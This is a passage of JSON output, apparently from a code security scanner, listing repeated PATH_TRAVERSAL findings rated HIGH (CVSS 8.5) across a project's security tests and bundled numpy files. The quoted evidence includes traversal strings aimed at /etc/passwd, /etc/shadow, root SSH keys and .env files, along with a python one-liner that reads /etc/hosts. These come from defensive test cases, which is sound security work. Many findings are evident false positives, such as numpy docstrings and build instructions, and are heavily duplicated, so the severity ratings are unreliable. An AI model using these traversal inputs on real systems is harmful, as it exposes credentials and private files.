            "context": "            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "context": "            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test that path traversal attempts are blocked\"\"\"\n        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test that path traversal attempts are blocked\"\"\"\n        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test that path traversal attempts are blocked\"\"\"\n        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test that path traversal attempts are blocked\"\"\"\n        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test that path traversal attempts are blocked\"\"\"\n        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test that path traversal attempts are blocked\"\"\"\n        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../../../root/.ssh/id_rsa\",",
            "context": "        traversal_attempts = [\n            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../home/user/.env\",",
            "context": "            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../home/user/.env\",",
            "context": "            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../home/user/.env\",",
            "context": "            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../home/user/.env\",",
            "context": "            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../home/user/.env\",",
            "context": "            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../home/user/.env\",",
            "context": "            \"../../../etc/passwd\",\n            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../../var/log/auth.log\",",
            "context": "            \"../../../../../../root/.ssh/id_rsa\", \n            \"../../../home/user/.env\",\n            \"../../../../var/log/auth.log\",\n            \"/etc/passwd\",\n            \"/root/.bashrc\",",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../etc/passwd\"],",
            "context": "            \n            # Stage 2: Try path traversal\n            [\"git\", \"log\", \"../../../etc/passwd\"],\n            \n            # Stage 3: Try to access SSH keys",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../etc/passwd\"],",
            "context": "            \n            # Stage 2: Try path traversal\n            [\"git\", \"log\", \"../../../etc/passwd\"],\n            \n            # Stage 3: Try to access SSH keys",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../etc/passwd\"],",
            "context": "            \n            # Stage 2: Try path traversal\n            [\"git\", \"log\", \"../../../etc/passwd\"],\n            \n            # Stage 3: Try to access SSH keys",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../etc/passwd\"],",
            "context": "            \n            # Stage 2: Try path traversal\n            [\"git\", \"log\", \"../../../etc/passwd\"],\n            \n            # Stage 3: Try to access SSH keys",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../etc/passwd\"],",
            "context": "            \n            # Stage 2: Try path traversal\n            [\"git\", \"log\", \"../../../etc/passwd\"],\n            \n            # Stage 3: Try to access SSH keys",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 290,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../etc/passwd\"],",
            "context": "            \n            # Stage 2: Try path traversal\n            [\"git\", \"log\", \"../../../etc/passwd\"],\n            \n            # Stage 3: Try to access SSH keys",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_datasource.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/tmp/.../home/guido/foobar.txt'",
            "context": "        <open file '/home/guido.foobar.txt', mode 'r' at 0x91d4430>\n        >>> ds.abspath('/home/guido/foobar.txt')\n        '/tmp/.../home/guido/foobar.txt'\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_datasource.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/tmp/.../home/guido/foobar.txt'",
            "context": "        <open file '/home/guido.foobar.txt', mode 'r' at 0x91d4430>\n        >>> ds.abspath('/home/guido/foobar.txt')\n        '/tmp/.../home/guido/foobar.txt'\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 966,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(os.fspath(filename), mode + 'b') as fp:",
            "context": "        }\n        # If we got here, then it should be safe to create the file.\n        with open(os.fspath(filename), mode + 'b') as fp:\n            _write_array_header(fp, d, version)\n            offset = fp.tell()",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'.../site-packages/numpy/core/include'  # may vary",
            "context": "    --------\n    >>> np.get_include()\n    '.../site-packages/numpy/core/include'  # may vary\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'.../site-packages/numpy/core/include'  # may vary",
            "context": "    --------\n    >>> np.get_include()\n    '.../site-packages/numpy/core/include'  # may vary\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 448,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 448,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 448,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 448,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 157,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "outmess(f'Reading f2cmap from {f2cmap_file!r} ...\\n')",
            "context": "    # they use PARAMETERS in type specifications.\n    try:\n        outmess(f'Reading f2cmap from {f2cmap_file!r} ...\\n')\n        with open(f2cmap_file) as f:\n            d = eval(f.read().lower(), {}, {})",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test_nanfunctions.py",
            "line": 1431,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(tmpdir.join(\"data.bin\"), \"w+b\") as fh:",
            "context": "    # check that on bad input, the error is from fmax (rather than maximum).\n    a = np.arange(10., dtype=float)\n    with open(tmpdir.join(\"data.bin\"), \"w+b\") as fh:\n        fh.write(a.tobytes())\n        mm = np.memmap(fh, dtype=a.dtype, shape=a.shape)",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test_format.py",
            "line": 466,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(path, 'rb+') as f:",
            "context": "                format.write_array(f, arr)\n            # truncate the file by one byte\n            with open(path, 'rb+') as f:\n                f.seek(-1, os.SEEK_END)\n                f.truncate()",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/typing/tests/data/pass/ndarray_misc.py",
            "line": 5,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "function-based counterpart in `../from_numeric.py`.",
            "context": "\nMore extensive tests are performed for the methods'\nfunction-based counterpart in `../from_numeric.py`.\n\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/typing/tests/data/pass/ndarray_misc.py",
            "line": 5,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "function-based counterpart in `../from_numeric.py`.",
            "context": "\nMore extensive tests are performed for the methods'\nfunction-based counterpart in `../from_numeric.py`.\n\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
